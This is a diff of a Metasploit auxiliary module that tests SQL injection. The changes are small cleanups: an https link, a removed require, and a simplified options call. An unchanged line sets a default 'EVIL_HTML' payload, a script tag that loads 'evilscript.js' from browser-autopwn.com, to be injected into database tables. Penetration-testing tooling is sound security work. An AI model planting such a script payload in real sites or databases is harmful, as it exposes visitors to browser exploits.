@@ -1,15 +1,11 @@
 ##
-# This module requires Metasploit: http://metasploit.com/download
+# This module requires Metasploit: https://metasploit.com/download
 # Current source: https://github.com/rapid7/metasploit-framework
 ##
 
 require 'rex/proto/http'
-require 'msf/core'
-
-
 
 class MetasploitModule < Msf::Auxiliary
-
   include Msf::Exploit::Remote::HttpClient
   include Msf::Auxiliary::Scanner
   include Msf::Auxiliary::WmapModule
@@ -34,7 +30,7 @@ class MetasploitModule < Msf::Auxiliary
         OptBool.new('TEXT_INT_INJECTION', [ true,  "Perform string injection", false]),
         OptBool.new('COMMENTED', [ true,  "Comment end of query", true]),
         OptString.new('EVIL_HTML', [ true,  "Evil HTML to add to tables", '<script src=http://browser-autopwn.com/evilscript.js></script>']),
-      ], self.class)
+      ])
 
   end
 
@@ -92,5 +88,4 @@ EOF
   print_status("Request sent.")
 
   end
-
 end
